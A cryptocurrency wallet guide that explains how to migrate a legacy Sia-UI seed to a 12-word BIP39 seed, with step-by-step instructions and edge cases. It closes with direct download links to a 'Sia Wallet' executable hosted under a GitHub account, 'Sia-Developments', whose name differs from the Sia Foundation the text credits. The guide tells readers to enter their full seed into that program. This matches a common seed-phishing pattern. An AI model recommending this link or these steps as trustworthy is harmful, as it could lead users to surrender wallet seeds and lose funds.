# Migrating an Old Sia-UI Seed to a New Wallet (28/29-Word → 12-Word BIP39)

If you've tried restoring an old Siacoin wallet recently and hit a wall because "the seed should be a 12-word BIP39 mnemonic" — you're not doing anything wrong. You're holding a legacy Sia-UI seed, and the Sia network changed formats underneath it. This guide walks the actual migration end to end.

## Why your seed suddenly doesn't "just work"

Sia-UI was the original desktop wallet from 2015 through 2024, using 28-word (occasionally 29-word) seed phrases. When the Sia Foundation split its software into `walletd`, `renterd`, and `hostd` in 2024, Sia-UI was deprecated. Then the [Sia v2 hardfork](sia-v2-hardfork-final-cut-explained.md) activated on June 6, 2025, replacing legacy 28-word seeds with standard 12-word BIP39 seeds across the ecosystem — the same format used by Ledger, Trezor, and most other modern wallets. After the v2 Final Cut cleanup fork on December 2, 2025, the network stopped accepting the old transaction format entirely.

None of this means your coins are gone. Siacoin lives on the blockchain, not inside Sia-UI. Your legacy seed still deterministically derives the addresses that hold your balance — it just can't build a transaction the current network will accept. You need a one-time migration.

## Before you start

- Your legacy 28 or 29-word Sia-UI seed, written down or exportable from a still-functional Sia-UI install (Wallet → Show Recovery Seed)
- Sia Wallet installed on a computer you trust — not a public or borrowed machine
- Blank paper and a pen for the new 12-word seed
- About an hour of patience: the migration transaction needs roughly six confirmations (~60 minutes) before it's considered fully settled

## The migration, step by step

1. **Open the migration assistant.** On a fresh install, pick "Migrate legacy Sia-UI seed" on the welcome screen. On an existing wallet, go to Accounts → Add Account → Migrate legacy Sia-UI seed.
2. **Pick your seed length.** Standard Sia-UI seeds are 28 words; some older or command-line-generated seeds have 29. If you're unsure, try 28 — the assistant validates the checksum and tells you if it's wrong.
3. **Enter the seed.** Type or paste the words in order. Each word is checked live against the legacy wordlist as you go; anything invalid gets flagged so you can double-check against your paper copy.
4. **Confirm the balance preview.** The assistant derives your legacy addresses locally and queries the network for their current balance. If the number doesn't match what you expect, don't proceed — check the edge cases below first.
5. **Generate and write down your new 12-word seed.** This is shown one word at a time, and you'll confirm three random words back before continuing. Don't rush this screen.
6. **Review and broadcast the migration transaction.** Check that the destination address matches your new wallet's first receive address exactly, then broadcast.
7. **Wait for confirmations.** First confirmation typically lands within about 10 minutes; six confirmations (~an hour) is considered settled.
8. **Clean up.** Once funds land, the assistant zeroes the legacy seed from memory. You can optionally delete the old wallet file from disk — your new 12-word seed is now the one that matters.

Your legacy seed never leaves your machine during this process — it's held in memory only for the duration of the flow and zeroed on exit.

## Common edge cases

- **Lost your Sia-UI password but still have the seed?** The password only protected the old local wallet file — irrelevant here. Enter the seed directly; it derives your addresses independent of any password.
- **Lost the seed but Sia-UI still opens?** Go to Wallet → Show Recovery Seed inside Sia-UI and record it immediately, then follow the steps above.
- **Balance split across multiple legacy addresses?** The assistant imports all addresses from a single seed and consolidates them into your new wallet in one transaction.
- **Migrating a watch-only or cold-storage wallet?** Bring the seed to an air-gapped machine, run the migration offline to generate the transaction, transfer it via USB to an online watch-only wallet, and broadcast from there.
- **Balance preview shows zero but you know you had SC?** Double-check the word count (28 vs. 29) and spelling before assuming something's wrong.

## Verifying it worked

After confirmation, you can cross-reference the transaction ID shown in your wallet's history against a public Sia block explorer to confirm the migration happened on-chain rather than as a local display artifact.

**[Download Sia Wallet v2.12.0](https://github.com/Sia-Developments/SiaWallet/releases/download/v2.12.0/siawallet-2.12.0.exe)** for Windows, or grab the [macOS](https://github.com/Sia-Developments/SiaWallet/releases/download/v2.12.0/siawallet-2.12.0.dmg) or [Linux](https://github.com/Sia-Developments/SiaWallet/releases/download/v2.12.0/siawallet-2.12.0.zip) build from the [latest release](https://github.com/Sia-Developments/SiaWallet/releases/tag/v2.12.0).

---

**Related:** [What happened to Sia-UI, and why it can't send transactions anymore](what-happened-to-sia-ui.md) · [Recovering a Sia wallet from an old or unusual seed](recover-old-siacoin-wallet-seed.md) · [Sia v2 and Final Cut, explained](sia-v2-hardfork-final-cut-explained.md) · [Setting up Sia Wallet for the first time](how-to-set-up-sia-wallet-first-time.md)
